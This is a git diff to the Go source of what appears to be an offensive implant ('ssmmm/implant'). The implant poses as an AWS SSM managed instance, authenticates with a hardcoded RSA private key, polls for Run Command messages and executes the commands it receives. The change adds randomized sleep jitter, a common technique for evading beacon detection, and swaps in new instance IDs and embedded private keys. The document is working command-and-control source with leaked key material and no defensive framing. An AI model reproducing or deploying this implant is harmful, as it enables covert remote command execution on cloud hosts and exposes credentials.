@@ -3,6 +3,7 @@ package main
 import (
 	"encoding/json"
 	"fmt"
+	"math/rand"
 	"strings"
 	"time"
 
@@ -13,42 +14,62 @@ import (
 	"github.com/grines/ssmmm/implant/implantutil"
 )
 
-const managedInstanceID string = "mi-0d416eb76fdc3f731"
-const publicKey string = "MIIEowIBAAKCAQEAwCWYd69ADZjlmqvP+NtnWQi82cq+TmpHMlvNzHm2VXmxgEikNUDGcK9JxsgrIDw6T0EzRFXbl2X2vpqAtX3lV+ALs+sSwNkYrPUtBFwxydxwUHuq+4QJcIfRMsRjwPLOEon5zYBdvbu3AWhq4OHcqmYyTg3kQFW+UeH5Zsh96aDAejlHELtXYxUi12K+roefDQY5G5ePgL3+7UXGfxo/etuNOy9nNPRcNCLTt3dDNP8kc478t50PNpgDmXTataIZahte5IvUeTaaLlYqIl65NJ7RgM2PIDF1yEymnMTWUva1lG5q1Z03r9qpMxuSc2IP5+QVwueTf5OugXVwHCA8wwIDAQABAoIBAQCz3L1rE2ZPFBehgEEOfzqvsiktacZYms2Iiz0KscgHHQIVxmnH25ml87+IzujnpNkkRTEbP49tmimt4+yld3LOnk/2HA8S7GVXya1ZDoAgqDOOcyTriX5Ykxo1fnauL9rMqdFnF0koiOXW8IpTdblc3IssW36U5m5gMbqHBxguLwZQ2LOL0v0w2qDJ6nGE2kAtARVLVnB9YXVy+ouTQ4UH/UeMyZp2SVws0I96vUUZa3GaN8lYQzEKZDeLJU4HzoCvffx5ju3a6OdkS1il5SvoRgdKw/8XiOGlLgqFQLW5/nMQxEzmO9AZxFLxG1RoY8PslrNnk/Ha5azgZpqRfl5hAoGBAMy+EY+/ShJ8uS087sMwVfEEimkxmlFOFWyAvtx9D2ZddEXMn4EbTrFcm6dLawEbrzE67vEvdIS+/ps/ZLQeNCNJZBS6BmriD+2xknPDWPhvqV6gl1Dmc/AESC1OmVCVu/QubveXOFgU5/yBFW0rSVbGnlqCloPwj/uBaWRcPVwTAoGBAPBARqC+iNaM1THDUW/Gq+CN7AsVzXAfy/wPqVWwPS5wDnE7fQLIFB2ugjoxEFX8BAS1GGVNBmNPRT0jmRLtjsRyzdlX0kTMRAvQbPGcHq/5tbEIhHyycrmoD07j0hD2seb4l92YGhNUxfZYxWdg8Rlw4ce6L+m3/Jw6V3S8u1KRAoGAXFKYuKkZTZzQI4YGZB23oybZAvZLD76WCodDiUkbWJ1rgM30XtNheLi5t4ZaifVh2mEovbkYYYN+a6L6Vf4IpKDDcFUx76Bgbl5UG79Krzwqs3DWyrQgM2q64TNADwZ16nXFs/+MeKt0sHfEoaWTPH3zify4wmYHhvGkBI1TXeECgYB+c3Y5GM/xDQMRRBpS2KCSemBonTsZ7sJwktWvsikhjf0sAAGWOzTLQpRsiHJur0x2JdMHTnk0P/7TZS8mVT61iy9pW93iNBkEltkgeel0+dt1qGQDNfFIYnpcLXDdWNreFK3qBiqDTjU7qhGMjeuYVl+fvhGF1D7zA4oQeV2m4QKBgE20jUPRq6u5v6mFqojilGOFuIvGwNMyfcsTE6huImZ+3Mvxh1uvbd4LzV4XfrIlCRbmCQEcgIEx12YjtRalkna506GIIxH8Kl++39Zd7VDAal2MQH5j+IfUGqSsFg1cxWEOOboJRBSDntM47MT9803XEFSU00nSmoFsN1lRWHjP"
-const fingerPrint string = "90312ec8-c247-47eb-823f-ad6e8ae1fff5"
-const instanceRegion = "us-east-1"
+const managedInstanceID string = "mi-0c04d4f75f43efc19"
+const publicKey string = "MIIEpAIBAAKCAQEAz9P3R25fX3vwQfdJ0UZcUUeQVfY8q1giiSNLvkM8CaK6OGV2WMgfrQqRAqcPeLsGEBsh70DG2OLVhjndJZqSseivTS4b2/wzTCEAWjf+moLTVsNMXjs3hTt++PJI7v9VD+cRqC5CMfUFQCJENWAczGynJqyACSyB1DetiZB7YfKmKfCiruzr83gq9teuDYWHGCn/kzga+uTTtX7m9V+UQsxKqeRcQwSQ60Ef58efC8+A5mYEreTTF+rkYgDw4cDH2chBapBw5pyJe/+6RvffhrEFPYaSrkBWS4yTedND9HuIAz7ch6psT8XRcwg0//jHq7DopavRbdacGPBclYgseQIDAQABAoIBAQDKPLweuJr6ccLEjn04tr1TIs6jt/Al1KgWx1AHn6mmvsFz69gUYPniC6w85pC5rVUjCyQki+Z0W5fo/BnlY9toYMNl2X6mvW61oE+Ve3O4q6I4heeksv8+GT1fx3WNjM4boYGfJRSpRIONe0rgndyoWPr3OVmGk9bqyhuHCB/omNQg6mzzOwynp4hav0WL8BK9s8pBmLXVGflSoQiyKHen/IE/kJuM2Berp3FENr9KfhzdFv1/GyotRtCYOzdjbjQAU7pUoIEinPhhLBZ2J51mZgylx3dbcqtL/d45B5TkDLOT3AAtrvSvvojwwUQVKzVrMMPN3hZ1pVTezKUECrdhAoGBANz4S5JjKe3dGvLiwXgiYdn0uRX0K999rx5U3meb86z58lQlIHUtEX0kw1VPk/KdtHBo5BTDiTvjVmmNwvrZFyoB5/fiCNXlvCPK9w+/HZybzTAAl+z8D3SF3x+MINHbbLFTo0iulpp5cr/RKLkbbaZfnXVumnuT6BPZL67ld0RdAoGBAPDGU92O4wCEYkbhsb4fZb0n6SUzvriQQwirTiMnrFTq+7mp1zsAEM/rtuCV59sV/StfVF+51O8bJGeQmpwZAHxQk08MIIfLjUSIrGfi6Oo4Y8z4MWobISCXY7IOadJRsxmj4UeOSe3kuwBLPwrDdiRAACdorOIhuNxSRqgEWUbNAoGATYSxhk5RdEe/33tbIdj1+O9YSvJYvdOqrnpZd4GHT6Rztb88jr7bxsox2GjNXyyiE1lIwlwCdccAFpGL2FJ2RN9cUGK0dM1eXjQizhxeuAUUS4W5xoJ6rYcVSkzvao+OpvrPan0NCm4WqmIm5iFQKzCZ3YuKmFW/8c6cYr/PQmUCgYADTJRlmsmdfjLiicEnu8JnHx7gtZ7NZJymh8JgVPDVkQq19o/ObSfN0YsF9MfihqCbcYj0btVuGU8cZCzaKrWI/ommMaJYef+Litvh6IgMfY1Qh64VqB2CFtD05aGpkhkEJuy1UEvPCK1PSbipaxg5Uu8tmw+TYaboze/N6ZFXmQKBgQCv+CAZpQC2ggNx2Ez8qQw41gZ+UmwKBZ2WULaP1zIMUcid9ja7fPvX0ScNJ/KlV2xkcSc3XHADPMN9u5wOC5jUlPDo3/xatbCrsrRDAgh56gGi7/6/7D98jLVpUIse23S/iz/JgzUkGspnPrt5FnqT6/EsPw+eJS9vwbu7fcVA+Q=="
+const fingerPrint string = "a4e3321b-c692-469e-6c18-93d6d3ef2a05"
+const instanceRegion = "us-west-2"
+const sleep time.Duration = 1000000000
+
+func init() {
+	rand.Seed(time.Now().UnixNano())
+}
 
 func main() {
 
 	for {
-		//Need some custome jitter here
-		time.Sleep(100 * time.Millisecond)
+
+		jitter := time.Duration(rand.Int63n(int64(sleep)))
+		jit := sleep + jitter/2
+		fmt.Println(jit)
+		time.Sleep(jit)
 
 		//Get Service Role Token from RSA private key
-		tokens := awsssm.GetRoleTokenFromRSA(managedInstanceID, publicKey, instanceRegion)
+		tokens, err := awsssm.GetRoleTokenFromRSA(managedInstanceID, publicKey, instanceRegion, fingerPrint)
+		if err != nil {
+			fmt.Println(err.Error())
+		} else {
 
-		//Update instace information to active
-		awsssm.UpdateInstanceInformation(tokens, managedInstanceID, instanceRegion)
+			//Update instace information to active
+			awsssm.UpdateInstanceInformation(tokens, managedInstanceID, instanceRegion)
 
-		//Get pending RunCommands
-		messages := awsssm.GetRunCommandMessages(tokens, managedInstanceID, instanceRegion)
-
-		//Loop through and run commands
-		for _, m := range messages.Messages {
-			var payload awsssm.SendCommandPayload
-			json.Unmarshal([]byte(m.Payload), &payload)
-			jsonutil.Marshal(payload)
-			cmdid := payload.CommandID
-			if payload.OutputS3KeyPrefix != "" {
-				awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
-				implantup.RecieveFile(payload)
-
+			//Get pending RunCommands
+			messages, err := awsssm.GetRunCommandMessages(tokens, managedInstanceID, instanceRegion)
+			if err != nil {
+				//fmt.Println(err.Error())
+				//fmt.Println("fallback")
+				//command := awsssm.GetInstanceInformation(tokens, managedInstanceID, instanceRegion)
+				//fmt.Println(command)
+				//implantrun.RunCommand(command.InstanceInformationList[0].PlatformType, "fallback", tokens, managedInstanceID, instanceRegion)
 			} else {
-				for _, c := range payload.Parameters {
-					str := fmt.Sprintf("%v", c)
-					str = strings.TrimSuffix(str, "]")
-					str = implantutil.TrimFirstRune(str)
-					implantrun.RunCommand(str, cmdid, tokens, managedInstanceID, instanceRegion)
+
+				//Loop through and run commands
+				for _, m := range messages.Messages {
+					var payload awsssm.SendCommandPayload
+					json.Unmarshal([]byte(m.Payload), &payload)
+					jsonutil.Marshal(payload)
+					cmdid := payload.CommandID
+					if payload.OutputS3KeyPrefix != "" {
+						awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+						implantup.RecieveFile(payload)
+
+					} else {
+						for _, c := range payload.Parameters {
+							str := fmt.Sprintf("%v", c)
+							str = strings.TrimSuffix(str, "]")
+							str = implantutil.TrimFirstRune(str)
+							implantrun.RunCommand(str, cmdid, tokens, managedInstanceID, instanceRegion)
+						}
+					}
 				}
 			}
 		}
